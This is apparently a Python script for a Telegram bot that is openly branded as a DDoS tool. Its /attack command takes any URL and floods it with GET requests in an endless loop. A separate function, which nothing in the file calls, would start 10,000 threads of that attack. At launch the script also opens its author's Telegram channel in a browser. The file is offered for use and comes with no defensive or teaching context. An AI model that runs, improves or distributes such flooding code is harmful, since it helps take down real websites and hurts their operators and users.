#!/usr/bin/python3
#!/coded/by/@DARK_LMNx999

# JOIN ➤ t.me/DARK_TEAM_LMNx9

import os,requests,threading,telebot
from telebot import *

BOT_TOKEN = ""#ENTER YOUR BOT TOKEN HERE
bot = TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    owner = types.InlineKeyboardButton(text="Owner",url="https://t.me/DARK_LMNx999")
    markup = types.InlineKeyboardMarkup().add(owner)
    bot.reply_to(message,"Welcome to LMNx9 DDoS bot 🤡\n\nUses:\n\t/attack example.com",reply_markup=markup)
    
@bot.message_handler(commands=["attack"])
def Ddos(message):
    user_text = message.text.split()
    if len(user_text)==2:
        user_text=user_text[1]
        bot.reply_to(message,f"Attack Send Successfully !\nURL:{user_text}\n")
        print(f"Attack Sended: [{user_text}]")
        while True:
            response = requests.get(user_text)
    else:
            bot.reply_to(message,f"Uses:\n/attack example.com")
            
def launch_attack(message):
    for _ in range(10000):
        threading.Thread(target=Ddos, args=(message,)).start()
        
@bot.message_handler(func=lambda msg: True)
def echo_all(message):
    owner = types.InlineKeyboardButton(text="Owner",url="https://t.me/DARK_LMNx999")
    markup = types.InlineKeyboardMarkup().add(owner)
    bot.reply_to(message,"Uses:\n/attack https://example.com",reply_markup=markup)

os.system('xdg-open https://t.me/DARK_TEAM_LMNx9')
bot.infinity_polling()
